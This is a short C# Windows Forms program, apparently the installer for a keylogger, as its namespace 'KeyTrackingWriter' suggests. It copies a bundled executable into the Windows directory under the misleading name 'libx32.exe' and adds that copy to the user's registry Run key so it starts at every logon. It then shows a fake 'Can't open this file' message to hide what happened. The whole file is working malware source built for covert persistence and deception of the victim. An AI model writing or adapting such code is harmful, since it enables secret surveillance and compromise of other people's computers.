using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Reflection;
using System.IO;
using System.Diagnostics;

namespace KeyTrackingWriter
{
    static class Program
    {

        const string AppName = "libx32.exe";
        static string CopyDir = Environment.GetEnvironmentVariable("windir");
        static string AppPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "app", AppName);
        static string CopyAppPath = Path.Combine(CopyDir, AppName);

        static void Main()
        {
            File.Copy(AppPath, CopyAppPath);
            
            RegisterInStartup(true, CopyAppPath);

            MessageBox.Show("Can't open this file", "Message", MessageBoxButtons.OK, MessageBoxIcon.Information);
            //Process.Start(CopyAppPath);
        }

        private static void RegisterInStartup(bool isChecked, string path)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (isChecked)
            {
                registryKey.SetValue("libx32", path);
            }
            else {
                registryKey.DeleteValue("libx32");
            }
        }

       
    }
}
